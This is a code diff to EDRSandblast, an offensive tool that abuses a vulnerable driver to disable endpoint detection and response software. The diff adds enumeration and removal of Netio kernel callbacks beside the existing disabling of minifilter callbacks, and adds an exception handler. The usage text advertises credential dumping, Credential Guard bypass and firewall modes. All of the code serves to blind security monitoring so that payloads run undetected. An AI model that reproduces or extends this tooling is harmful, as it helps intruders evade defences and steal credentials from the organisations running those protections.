@@ -31,7 +31,9 @@
 #include "WdigestOffsets.h"
 
 #include "../EDRSandblast/EDRSandblast.h"
-#include "../KernellandBypass/utils.h"
+#include "../KernellandBypass/memory.h"
+#include "../KernellandBypass/symbol.h"
+#include "../KernellandBypass/netio.h"
 
 typedef NTSTATUS(NTAPI* NtQueryInformationProcess_f)(
     HANDLE          ProcessHandle,
@@ -75,7 +77,17 @@ BOOL WasRestarted() {
 
 */
 
+LONG WINAPI MyUnhandledExceptionFilter(struct _EXCEPTION_POINTERS* ExceptionInfo)
+{
+   DWORD dwCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
+   printf("An unhandled exception occurred. Exception Code: %x\n", dwCode);
+   DebugBreak();
+   return EXCEPTION_EXECUTE_HANDLER;
+}
+
 int _tmain(int argc, TCHAR** argv) {
+   SetUnhandledExceptionFilter(MyUnhandledExceptionFilter);
+   
     // Parse command line arguments and initialize variables to default values if needed.
     const TCHAR usage[] = TEXT("Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard | firewall> [--usermode [--unhook-method <N>] [--direct-syscalls]] [--kernelmode] [--dont-unload-driver] [--no-restore] [--driver <RTCore64.sys>] [--service <SERVICE_NAME>] [--nt-offsets <NtoskrnlOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [--add-dll <dll name or path>]* [-o | --dump-output <DUMP_FILE>]");
     const TCHAR extendedUsage[] = TEXT("\n\
@@ -176,6 +188,7 @@ Other options:\n\
     BOOL foundNotifyRoutineCallbacks = FALSE;
     BOOL foundObjectCallbacks = FALSE;
     BOOL foundMinifilterCallbacks = FALSE;
+    BOOL foundNetio = FALSE;
     HOOK* hooks = NULL;
     //TODO implement a "force" mode : remove notify routines & object callbacks without checking if it belongs to an EDR (useful as a last resort if a driver is not recognized)
 
@@ -361,6 +374,8 @@ Other options:\n\
             return EXIT_FAILURE;
         }
 
+InitModulesAndSymbols();
+
         if (_tcslen(ntoskrnlOffsetCSVPath) == 0) {
             TCHAR offsetCSVName[] = TEXT("NtoskrnlOffsets.csv");
             PathAppend(ntoskrnlOffsetCSVPath, currentFolderPath);
@@ -469,8 +484,16 @@ Other options:\n\
 
         _putts_or_not(TEXT("[+] Checking if EDR callbacks are registered for minifilters..."));
         foundMinifilterCallbacks = EnumMinifilterCallbacks();
-        _tprintf_or_not(TEXT("[+] [MinifilterCallblacks]\tObject callbacks are %s !\n"), foundMinifilterCallbacks ? TEXT("present") : TEXT("not found"));
+        _tprintf_or_not(TEXT("[+] [MinifilterCallblacks]\t callbacks are %s !\n"), foundMinifilterCallbacks ? TEXT("present") : TEXT("not found"));
         if (foundMinifilterCallbacks) {
+            isSafeToExecutePayloadKernelland = FALSE;
+        }
+        _putts_or_not(TEXT(""));
+
+        _putts_or_not(TEXT("[+] Checking if EDR callbacks are registered for Netio ..."));
+        foundNetio = EnumNetio();
+        _tprintf_or_not(TEXT("[+] [Netio]\t callbacks are %s !\n"), foundNetio ? TEXT("present") : TEXT("not found"));
+        if (foundNetio) {
             isSafeToExecutePayloadKernelland = FALSE;
         }
         _putts_or_not(TEXT(""));
@@ -694,6 +717,11 @@ Other options:\n\
             if (foundMinifilterCallbacks) {
                 _putts_or_not(TEXT("[+] Disabling Minifiter callbacks..."));
                 DisableMinifilterCallbacks();
+                _putts_or_not(TEXT(""));
+            }
+            if (foundNetio) {
+                _putts_or_not(TEXT("[+] Disabling Netio callbacks..."));
+                DisableNetio();
                 _putts_or_not(TEXT(""));
             }
 
